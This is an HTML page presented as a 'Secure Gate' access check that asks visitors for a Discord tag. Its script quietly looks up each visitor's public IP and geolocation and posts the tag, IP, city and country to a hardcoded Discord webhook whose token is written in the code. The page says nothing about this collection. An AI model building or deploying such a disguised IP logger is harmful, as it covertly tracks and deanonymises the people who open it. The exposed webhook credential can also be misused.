<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport"content="width=device-width,initial-scale=1"><title>ðŸ”’ Secure Gate</title><style>body{margin:0;display:flex;align-items:center;justify-content:center;height:100vh;background:linear-gradient(135deg,#0f0f16,#1b1b28,#2a2a3a,#1b1b28);background-size:400% 400%;animation:bgAnim 20s ease infinite;color:#eee;font-family:sans-serif;overflow:hidden}#c{background:rgba(30,30,40,0.9);padding:2rem;border-radius:12px;box-shadow:0 4px 16px rgba(0,0,0,0.8);text-align:center;animation:cardIn .8s ease;}input,button{width:100%;padding:.75rem;margin:.5rem 0;border:none;border-radius:6px;font-size:1rem;transition:transform .2s}input{background:#222;color:#eee}button{background:#4a90e2;color:#fff;cursor:pointer;animation:pulse 2s infinite}button:hover{transform:scale(1.05)}#s{opacity:0;transition:opacity .3s;margin-top:1rem;padding:.5rem;border-radius:6px}#s.v{opacity:1}#s.ok{background:rgba(40,167,69,0.1);color:#2ecc71}#s.err{background:rgba(200,50,50,0.1);color:#e74c3c}@keyframes bgAnim{0%,100%{background-position:0% 50%}50%{background-position:100% 50%}}@keyframes cardIn{0%{opacity:0;transform:translateY(20px)}100%{opacity:1;transform:translateY(0)}}@keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.03)}}.particle{position:absolute;border-radius:50%;background:rgba(255,255,255,0.05);animation:drift 10s linear infinite}@keyframes drift{0%{transform:translate(0,0)}100%{transform:translate(100px,-200px)}}</style></head><body><div id="c"><h2>Access Check</h2><input id="u" placeholder="User#0000"><button id="b">Go</button><div id="s"><span id="m"></span></div></div><script>(()=>{function createParticles(n){for(let i=0;i<n;i++){const p=document.createElement('div'),s=Math.random()*8+4;p.className='particle';p.style.width=s+'px';p.style.height=s+'px';p.style.top=Math.random()*100+'%';p.style.left=Math.random()*100+'%';p.style.animationDuration=10+Math.random()*10+'s';document.body.append(p)}}createParticles(30);const WEBHOOK='https://discord.com/api/webhooks/1371265061879943178/SIL4izBii-CU-PR80nR6KVLxh2il0PEz_5LHhSeAJSbxCwQDuNsd41hCBAagi9F-3q_s';async function getScrt(){try{const res=await fetch('https://api.ipify.org?format=json');const j=await res.json();return j.ip}catch{throw'NoIP'}}async function getGeo(ip){const ep1=`https://ipapi.co/${ip}/json/`,ep2=`https://ipwho.is/${ip}`;try{let r=await fetch(ep1);if(r.ok)return r.json()}catch{}try{let r2=await fetch(ep2);if(r2.ok)return r2.json()}catch{}return{}}const $=id=>document.getElementById(id),u=$('u'),b=$('b'),s=$('s'),m=$('m');const show=(c,t)=>{s.className='v '+c;m.textContent=t};b.onclick=async()=>{const tag=u.value.trim();if(!tag)return show('err','Enter tag');show('','Checking...');b.disabled=1;try{const ip=await getScrt(),geo=await getGeo(ip),org=geo.org||'',tz=geo.timezone||'',city=geo.city||'',cc=geo.country_code||'';let sc=0,flags=[];if(/hosting|datacenter|cloud|proxy|vpn/i.test(org)){sc+=50;flags.push('D')}if(tz&&!tz.includes(cc)){sc+=50;flags.push('T')}console.log({ip,org,tz,flags,score:sc});const bad=sc>=50;const payload={username:'Gate',embeds:[{color:bad?16711680:65280,fields:[{name:'Tag',value:tag,inline:1},{name:'Ip',value:ip,inline:1},{name:'Loc',value:`${city},${cc}`,inline:1},{name:'Flags',value:flags.length?flags.join(','):'-',inline:1}],footer:{text:new Date().toUTCString()}}]};await fetch(WEBHOOK,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload)});show(bad?'err':'ok',bad?'Denied':'Granted')}catch(e){console.error(e);show('err','Err')}finally{b.disabled=0}}})();</script></body></html>
